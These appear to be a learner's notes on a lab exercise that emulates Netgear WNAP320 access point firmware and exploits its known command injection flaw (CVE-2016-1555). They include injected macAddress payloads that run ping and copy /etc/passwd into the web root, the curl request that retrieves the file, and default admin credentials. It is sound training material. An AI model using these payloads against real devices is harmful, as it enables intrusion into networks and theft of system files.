
What is firmware?
    A firmware is a small piece of software that makes hardware work and do what its manufacturer intended it to do. Without it the devices we use wouldn't work.

How to obtain it?
    These are the main ways of obtaining the firmware:
        Obtaining it from the vendor's website
        Googling it
        Reversing the mobile application  
        Sniffing the OTA (over the air) update mechanism
        Dumping it from the device
        Where was this firmware used?

The firmware we are about to analyze was used by Netgear for a few of their AP (access point) products. Besides that, the vulnerability affected multiple firmwares. You can take a look at them here: CVE-2016-1555. https://www.cvedetails.com/cve/CVE-2016-1555/

The firmware we are going to use is from NetGear and was used for Access Points (now it's been superceded by another version). In case you want to download it locally on your machine this is the download link: http://www.downloads.netgear.com/files/GDC/WNAP320/WNAP320%20Firmware%20Version%202.0.3.zip

If you access the Desktop folder on the given machine, you should see the firmware zip archive.
Let's unzip the archive.
As you can see, it dropped the release notes and another TAR archive. Let's extract that one too.
The file that interests us the most is "rootfs.squashfs". (--How do we know that other than the fact, it says root)

Let's use binwalk to extract the filesystem as follows:
binwalk -e <file-name>

As you can see, it dropped another folder named "_rootfs.squashfs.extracted".
Take a look inside the folder.
What it looks like?
- It looks like linux filesystems.

If you go into /home/www you'll find the web application that is used.

The next step would be analyzing each php file to try to find a vulnerability. I'll save you that time, and we'll take a look at "boardDataWW.php". This file contains a Command Execution vulnerability. The piece of code that we are interested is this:
-- Need to learn how to actually find what is vulnerable

The vulnerable function is the exec() one. The exec() function executes an external program without displaying the information (basically it's a blind command execution).
Time to emulate the system. For this task we'll use FAT(firmware analysis toolkit). FAT is based on Firmadyne (FIRMADYNE is an automated and scalable system for performing emulation and dynamic analysis of Linux-based embedded firmware) with some changes. Firmadyne uses a PostgreSQL database to store information about the emulated images. However for the core functionality PostgreSQL is not really needed. Hence FAT doesn't use it.

Elevate your shell and copy rootfs.squashfs to firmware-analysis-toolkit folder and change the owner of the file to root.

Now, let's kick off fat (firmware analysis toolkit) and emulate the system.

Take note to the IP that is outputted (usually is 192.168.0.100) and press enter to continue the emulation.

Once the emulation is done, create a port forward on your machine (the attacker machine) using SSH as follows:
    ssh -N iot@<machine-ip> -L 8081:192.168.0.100:80

iot@iot:~/Desktop$ cp rootfs.squashfs firmware-analysis-toolkit/
cp: cannot create regular file 'firmware-analysis-toolkit/rootfs.squashfs': Permission denied

iot@iot:~/Desktop$ sudo cp rootfs.squashfs firmware-analysis-toolkit/
[sudo] password for iot:

iot@iot:~/Desktop$ ls firmware-analysis-toolkit/
binwalk  fat.config  fat.py  firmadyne  LICENSE  qemu-builds  README.md  reset.py  rootfs.squashfs  setup.sh

iot@iot:~/Desktop$ cd firmware-analysis-toolkit/

iot@iot:~/Desktop/firmware-analysis-toolkit$ sudo chown root:root rootfs.squashfs ; ll
total 4388
drwxr-xr-x  6 root root    4096 iul 13 08:54 ./
drwxr-xr-x  4 iot  iot     4096 iul 13 08:47 ../
drwxr-xr-x  7 root root    4096 iun 16  2020 binwalk/
-rw-r--r--  1 root root     107 iun 16  2020 fat.config
-rwxr-xr-x  1 root root    5639 iun 16  2020 fat.py*
drwxr-xr-x 11 root root    4096 iun 16  2020 firmadyne/
drwxr-xr-x  8 root root    4096 iun 16  2020 .git/
-rw-r--r--  1 root root    1069 iun 16  2020 LICENSE
drwxr-xr-x  3 root root    4096 iun 16  2020 qemu-builds/
-rw-r--r--  1 root root    5428 iun 16  2020 README.md
-rwxr-xr-x  1 root root     734 iun 16  2020 reset.py*
-rwx------  1 root root 4435968 iul 13 08:54 rootfs.squashfs*
-rwxr-xr-x  1 root root    1673 iun 16  2020 setup.sh*

iot@iot:~/Desktop/firmware-analysis-toolkit$ sudo ./fat.py rootfs.squashfs

                               __           _
                              / _|         | |
                             | |_    __ _  | |_
                             |  _|  / _` | | __|
                             | |   | (_| | | |_
                             |_|    \__,_|  \__|

                Welcome to the Firmware Analysis Toolkit - v0.3
    Offensive IoT Exploitation Training http://bit.do/offensiveiotexploitation
                  By Attify - https://attify.com  | @attifyme

And other details generated by it.

Now, if you access http://localhost:8081 you should be able to access the web application (it's a NetGear AP).

The default credentials are admin (as the username) and password (as the password).

Once logged in, change the url to http://localhost:8081/boardDataWW.php. In the MAC Address field add some junk data, for example I added 112233445566, submit it, intercept (having Break: ON) it using BurpSuite(In my case: ZAP) and forward it to the Repeater(Selected Open/Resend with Request Editor).

macAddress=112233445566&reginfo=0&writeData=Submit
->
macAddress=112233445566;+ping+-c+15+127.0.0.1&reginfo=0&writeData=Submit

You'll notice a delay, which means the application is vulnerable to Command Execution. Let's copy the passwd file:


Anoter sent as:
macAddress=112233445566;+cp+/etc/passwd+.+#&reginfo=0&writeData=Submit

Let's request the file:
Thus,
curl http://localhost:8081/passwd
'''''
root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:100:sync:/bin:/bin/sync
mail:x:8:8:mail:/var/spool/mail:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
operator:x:37:37:Operator:/var:/bin/sh
haldaemon:x:68:68:hald:/:/bin/sh
dbus:x:81:81:dbus:/var/run/dbus:/bin/sh
nobody:x:99:99:nobody:/home:/bin/sh
sshd:x:103:99:Operator:/var:/bin/sh
admin:x:0:0:Default non-root user:/home/cli/menu:/usr/sbin/cli
'''''

Congrats, you have successfully attacked your first IoT system.

Closing thoughts by the room creator:
I came to the conclusion that pentesting IoT systems/devices is not that difficult. It's mainly attacking a web application to gain an initial foothold to the device, or in some cases the network protocols they are using (UPnP for example). Some IoT devices might use some outdated network protocols that have publicly available exploits. Another option would be "attacking" the hardware (hardware hacking), but that involves other things like having a physical device  you can tear apart, etc.

------------------------------------------------------------
To learn (for me):
- How to identify which place is suitable to attack. (Actually finding the boardDataWW.php and exec function)
- Learning more about the IoT genre as a whole in the context of Security
